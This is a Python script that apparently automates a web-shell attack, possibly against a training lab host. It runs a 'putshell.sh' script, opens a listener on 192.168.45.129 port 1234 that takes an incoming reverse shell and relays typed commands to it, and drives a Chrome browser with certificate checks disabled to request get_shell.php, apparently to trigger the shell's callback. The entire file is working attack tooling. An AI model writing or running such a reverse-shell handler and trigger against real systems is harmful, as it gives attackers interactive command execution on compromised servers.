import socket
import threading
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def setup_webdriver():
    """Sets up and returns a Chrome WebDriver with specific options."""
    chrome_options = Options()
    # Add arguments to ignore SSL errors
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--allow-running-insecure-content')
    # Uncomment and set the path if ChromeDriver is not in your PATH
    # chrome_options.binary_location = '/path/to/chromedriver'
    return webdriver.Chrome(options=chrome_options)

def navigate_to_urls(urls):
    """Navigates to a list of URLs using a WebDriver."""
    driver = setup_webdriver()
    try:
        for url in urls:
            driver.get(url)
    finally:
        driver.quit()

def run_socket_listener(ip, port):
    """Runs a socket listener on the specified IP and port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind((ip, port))
        listener.listen(1)
        print(f"Listening on port {port}")

        conn, addr = listener.accept()
        with conn:
            print(f'Connection established from {addr}')
            while True:
                data = conn.recv(1024).decode()
                print(data, end="")
                conn.send((input() + "\n").encode())

def execute_shell_script(script_name="putshell.sh"):
    """Executes a specified shell script."""
    os.system(f"bash {script_name}")

def main():
    """Main function to orchestrate the script's operations."""
    HOST, PORT = '192.168.45.129', 1234

    # Execute the shell script and start the listener in a separate thread
    execute_shell_script()
    threading.Thread(target=run_socket_listener, args=(HOST, PORT), daemon=True).start()

    # Set up WebDriver and navigate to specified URLs
    navigate_to_urls([
        "https://localhost/get.php?club_name=FCBarcelona&country_name=Spain",
        "https://localhost/get_shell.php?club_name=FCBarcelona&country_name=Spain"
    ])

if __name__ == "__main__":
    main()
